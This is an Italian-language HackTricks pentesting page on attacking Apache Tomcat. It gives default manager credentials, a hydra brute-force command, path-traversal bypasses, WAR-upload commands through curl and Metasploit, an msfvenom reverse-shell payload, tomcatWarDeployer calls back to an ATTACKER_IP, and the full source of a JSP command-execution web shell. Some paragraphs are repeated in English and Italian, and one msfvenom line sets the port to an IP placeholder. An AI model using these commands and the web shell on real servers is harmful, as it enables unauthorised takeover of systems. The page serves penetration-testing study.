# Tomcat

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilit√† pi√π importanti in modo da poterle correggere pi√π velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Scoperta

* Di solito viene eseguito sulla **porta 8080**
* **Errore comune di Tomcat:**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## Enumerazione

### **Identificazione della versione**
Per trovare la versione di Apache Tomcat, √® possibile eseguire un semplice comando:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
Questo cercher√† il termine "Tomcat" nella pagina dell'indice della documentazione, rivelando la versione nel tag del titolo della risposta HTML.

### **Posizione dei file del Manager**
Identificare le posizioni esatte delle directory **`/manager`** e **`/host-manager`** √® cruciale poich√© i loro nomi potrebbero essere modificati. Si consiglia una ricerca di forza bruta per individuare queste pagine.

### **Enumerazione degli username**
Per le versioni di Tomcat precedenti alla 6, √® possibile enumerare gli username tramite:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **Credenziali predefinite**
La directory **`/manager/html`** √® particolarmente sensibile in quanto consente il caricamento e la distribuzione di file WAR, il che pu√≤ portare all'esecuzione del codice. Questa directory √® protetta da un'autenticazione HTTP di base, con le credenziali comuni che sono:
- admin:admin
- tomcat:tomcat
- admin:<NOTHING>
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

Queste credenziali possono essere testate utilizzando:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
Un'altra directory importante √® **`/manager/status`**, che mostra la versione di Tomcat e del sistema operativo, facilitando l'identificazione delle vulnerabilit√†.

### **Attacco di forza bruta**
Per tentare un attacco di forza bruta sulla directory del manager, √® possibile utilizzare:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
Oltre a impostare vari parametri in Metasploit per mirare a un host specifico.

## Vulnerabilit√† comuni

### **Divulgazione della password tramite backtrace**
L'accesso a `/auth.jsp` potrebbe rivelare la password in un backtrace in circostanze fortunate.

### **Codifica URL doppia**
La vulnerabilit√† CVE-2007-1860 in `mod_jk` consente la traversa del percorso con codifica URL doppia, consentendo l'accesso non autorizzato all'interfaccia di gestione tramite un URL appositamente creato.

Per accedere alla web di gestione di Tomcat, vai a: `pathTomcat/%252E%252E/manager/html`

### /examples
Le versioni di Apache Tomcat da 4.x a 7.x includono script di esempio che sono suscettibili a divulgazione di informazioni e attacchi di cross-site scripting (XSS). Questi script, elencati in modo esaustivo, dovrebbero essere controllati per l'accesso non autorizzato e l'eventuale sfruttamento. Trova [ulteriori informazioni qui](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **Exploit di traversa del percorso**
In alcune [**configurazioni vulnerabili di Tomcat**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) √® possibile accedere a directory protette in Tomcat utilizzando il percorso: `/..;/`

Quindi, ad esempio, potresti essere in grado di **accedere alla pagina del gestore di Tomcat** accedendo a: `www.vulnerable.com/lalala/..;/manager/html`

**Un altro modo** per aggirare i percorsi protetti utilizzando questo trucco √® accedere a `http://www.vulnerable.com/;param=value/manager/html`


## RCE

Infine, se hai accesso al Tomcat Web Application Manager, puoi **caricare e distribuire un file .war (eseguire codice)**.

### Limitazioni

Sarai in grado di distribuire un WAR solo se hai **privilegi sufficienti** (ruoli: **admin**, **manager** e **manager-script**). Questi dettagli possono essere trovati in _tomcat-users.xml_ di solito definito in `/usr/share/tomcat9/etc/tomcat-users.xml` (varia tra le versioni) (vedi sezione [POST](tomcat.md#post)).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploit √® un framework di test di penetrazione open source che offre una vasta gamma di strumenti e risorse per eseguire test di penetrazione su sistemi e reti. √à ampiamente utilizzato dagli hacker etici e dai professionisti della sicurezza informatica per identificare e sfruttare le vulnerabilit√† dei sistemi.

Metasploit fornisce un'interfaccia utente basata su console che consente agli utenti di eseguire una serie di moduli e script predefiniti per eseguire attacchi mirati. Questi moduli possono essere utilizzati per eseguire attacchi di forza bruta, exploit di vulnerabilit√†, eseguire shell remote e molto altro.

Il framework Metasploit √® costantemente aggiornato con nuovi moduli e script per sfruttare le ultime vulnerabilit√† scoperte. Inoltre, offre anche la possibilit√† di creare moduli personalizzati per adattarsi alle esigenze specifiche di un test di penetrazione.

Metasploit √® uno strumento potente che richiede una conoscenza approfondita delle tecniche di hacking e delle vulnerabilit√† dei sistemi. √à importante utilizzare Metasploit solo per scopi legittimi, come test di penetrazione autorizzati o attivit√† di ricerca sulla sicurezza. L'uso improprio di Metasploit pu√≤ essere illegale e comportare conseguenze legali.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### Shell Inversa con MSFVenom

1. Creare il file war da distribuire:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
2. Carica il file `revshell.war` e accedi ad esso (`/revshell/`):

### Shell di bind e reverse con [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)

In alcuni scenari questo non funziona (ad esempio nelle vecchie versioni di sun)

#### Scarica
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### Shell inversa

Una shell inversa √® una tecnica utilizzata dai pentester per ottenere l'accesso remoto a un sistema target. Invece di stabilire una connessione diretta dal sistema target al sistema dell'attaccante, la shell inversa consente all'attaccante di stabilire una connessione dal proprio sistema al sistema target. Questo pu√≤ essere utile quando il sistema target √® dietro un firewall o ha restrizioni di connessione in uscita.

Per creare una shell inversa, √® necessario utilizzare un payload che consenta di stabilire una connessione di rete tra i due sistemi. Ci sono diversi strumenti e script disponibili per generare payload di shell inversa, come Metasploit Framework, Netcat e PowerShell.

Una volta che la connessione √® stata stabilita, l'attaccante pu√≤ eseguire comandi sul sistema target come se fosse direttamente connesso ad esso. Questo pu√≤ consentire all'attaccante di eseguire attivit√† di esplorazione, raccolta di informazioni, movimento laterale e persino di ottenere privilegi elevati sul sistema target.

√à importante notare che l'utilizzo di una shell inversa per accedere a un sistema senza autorizzazione √® illegale e pu√≤ comportare conseguenze legali gravi. La shell inversa dovrebbe essere utilizzata solo a fini di pentesting autorizzati e con il consenso del proprietario del sistema target.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### Bind shell

Una bind shell √® un tipo di shell remota che viene creata su una macchina target e si mette in ascolto su una porta specifica. Una volta che la connessione √® stabilita, l'attaccante pu√≤ interagire con la shell remota e ottenere il controllo completo del sistema target. Questo tipo di shell √® chiamato "bind" perch√© si lega a una porta specifica e si mette in ascolto per le connessioni in arrivo.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### Utilizzo di [Culsterd](https://github.com/hatRiot/clusterd)

Culsterd is a tool that can be used to exploit vulnerabilities in Apache Tomcat servers. It provides various modules that can be used to perform different types of attacks.

Culsterd √® uno strumento che pu√≤ essere utilizzato per sfruttare le vulnerabilit√† nei server Apache Tomcat. Fornisce vari moduli che possono essere utilizzati per eseguire diversi tipi di attacchi.

To use Culsterd, you need to have a valid username and password for the Tomcat server. Once you have obtained the credentials, you can use Culsterd to perform various actions such as deploying a web shell, executing commands, or downloading files from the server.

Per utilizzare Culsterd, √® necessario disporre di un nome utente e di una password validi per il server Tomcat. Una volta ottenute le credenziali, √® possibile utilizzare Culsterd per eseguire varie azioni come il deploy di una web shell, l'esecuzione di comandi o il download di file dal server.

Culsterd also supports brute-forcing attacks to guess the username and password combination. This can be useful if you don't have valid credentials but want to gain access to the server.

Culsterd supporta anche attacchi di forza bruta per indovinare la combinazione di nome utente e password. Questo pu√≤ essere utile se non si dispone di credenziali valide ma si desidera ottenere l'accesso al server.

To use Culsterd, you need to provide the IP address or hostname of the target Tomcat server, along with the port number and the desired module to execute. Culsterd will then attempt to exploit the vulnerability and perform the specified action.

Per utilizzare Culsterd, √® necessario fornire l'indirizzo IP o il nome host del server Tomcat di destinazione, insieme al numero di porta e al modulo desiderato da eseguire. Culsterd cercher√† quindi di sfruttare la vulnerabilit√† e di eseguire l'azione specificata.

It is important to note that using Culsterd to exploit vulnerabilities in Tomcat servers without proper authorization is illegal and unethical. Always ensure that you have the necessary permissions and legal rights before conducting any penetration testing activities.

√à importante notare che utilizzare Culsterd per sfruttare vulnerabilit√† nei server Tomcat senza autorizzazione adeguata √® illegale ed eticamente discutibile. Assicurarsi sempre di avere le autorizzazioni necessarie e i diritti legali prima di effettuare qualsiasi attivit√† di penetration testing.
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### Metodo manuale - Web shell

Crea **index.jsp** con questo [contenuto](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp):
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
Puoi anche installare questo (consente di caricare, scaricare ed eseguire comandi): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### Metodo Manuale 2

Ottieni una web shell JSP come [questa](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) e crea un file WAR:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Il nome del file delle credenziali di Tomcat √® _tomcat-users.xml_
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Altri modi per ottenere le credenziali di Tomcat:
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## Altri strumenti di scansione per Tomcat

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## Riferimenti
* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)


<details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilit√† pi√π importanti in modo da poterle correggere pi√π velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi stesso.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
